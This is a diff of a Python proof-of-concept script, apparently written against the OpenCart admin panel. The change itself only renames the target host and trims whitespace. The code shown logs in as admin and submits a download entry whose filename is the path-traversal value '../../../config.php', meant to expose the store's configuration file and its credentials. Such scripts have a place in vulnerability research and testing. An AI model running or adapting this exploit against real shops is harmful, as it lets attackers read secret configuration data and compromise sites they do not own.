@@ -1,7 +1,7 @@
 import requests
 import urllib3
 requests.packages.urllib3.disable_warnings()
-host = "web"
+host = "opencart"
 
 def loginad():
     session = requests.session()
@@ -42,8 +42,7 @@ def addfile(adcookies,adtoken):
     burp0_cookies = {"OCSESSID": adcookies}
     burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Cache-Control": "max-age=0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e4812b409b4", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     burp0_data = "-----------------------------7e4812b409b4\r\nContent-Disposition: form-data; name=\"download_description[1][name]\"\r\n\r\nfile_poc_2020\r\n-----------------------------7e4812b409b4\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n../../../config.php\r\n-----------------------------7e4812b409b4\r\nContent-Disposition: form-data; name=\"mask\"\r\n\r\n1234\r\n-----------------------------7e4812b409b4--\r\n"
-    session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=False,verify=False)
-    
+    session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=False,verify=False)   
     burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download&user_token="+adtoken
     r_check=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,allow_redirects=False,verify=False)
     print("add download file")
